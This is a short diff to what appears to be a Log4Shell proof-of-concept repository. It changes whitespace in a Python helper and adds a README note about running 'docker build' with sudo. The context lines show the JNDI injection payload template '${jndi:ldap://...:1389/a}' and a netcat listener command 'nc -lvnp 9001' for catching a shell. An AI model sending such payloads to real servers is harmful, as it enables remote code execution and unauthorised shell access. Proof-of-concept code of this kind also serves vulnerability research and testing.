@@ -150,8 +150,7 @@ def check_java() -> bool:
         '-version',
     ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
     return exit_code == 0
-
-
+    
 def ldap_server(userip: str, lport: int) -> None:
     sendme = "${jndi:ldap://%s:1389/a}" % (userip)
     print(Fore.GREEN + f"[+] Send me: {sendme}\n")
@@ -187,6 +186,11 @@ nc -lvnp 9001
 #!/bin/bash
 cd ~/mylog4j/log4j-shell-poc
 docker build -t log4j-shell-poc .
+```
+Run 
+```
+sudo docker build -t log4j-shell-poc .
+if you have not restarted you machine after docker installation
 ```
 # Run docker website
 ```
